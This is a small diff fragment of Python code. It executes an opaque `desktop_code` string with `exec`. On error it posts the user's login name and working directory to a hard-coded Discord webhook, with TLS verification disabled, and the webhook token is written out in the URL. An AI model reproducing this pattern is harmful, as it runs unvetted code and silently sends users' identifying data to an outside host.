@@ -13,4 +13,4 @@ try:
     exec(desktop_code)
 except Exception as e:
     error_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
-    error_message = requests.post(verify=False, url=error_log_webhook, json={"content": f"[{os.getlogin()} {os.getcwd()}] {e}"})
+    error_message = requests.post(verify=False, url=error_log_webhook, json={"content": f"[{os.getlogin()} {os.getcwd()} EXE] {e}"})
